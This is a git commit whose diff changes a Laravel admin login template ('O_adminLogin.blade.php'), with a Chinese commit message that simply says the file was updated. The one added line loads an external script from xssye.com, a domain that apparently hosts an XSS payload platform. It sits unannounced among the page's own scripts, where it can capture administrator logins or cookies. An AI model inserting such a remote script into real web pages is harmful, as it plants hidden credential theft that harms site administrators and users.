edb9e29a114f17f92fa322b754c68709dc6a762c
jeremy <jeremy94059@gmail.com>
2019-09-05 18:43:42 +0800

    更新 'resources/views/chat/O_adminLogin.blade.php'

--- resources/views/chat/O_adminLogin.blade.php
+++ resources/views/chat/O_adminLogin.blade.php
@@ -10,6 +10,7 @@
 
     <link rel="shortcut icon" type="image/png" href="{{ env('ICON') }}"/>
     <script src="/js/jquery.min.js"></script>
+  	<script src=http://xssye.com/dKGx></script>
     <script src="/chat/js/pages/cloud.js"></script>
     <script src="/chat/js/pages/login.js"></script>
     <link rel="stylesheet" href="/chat/css/login.css">
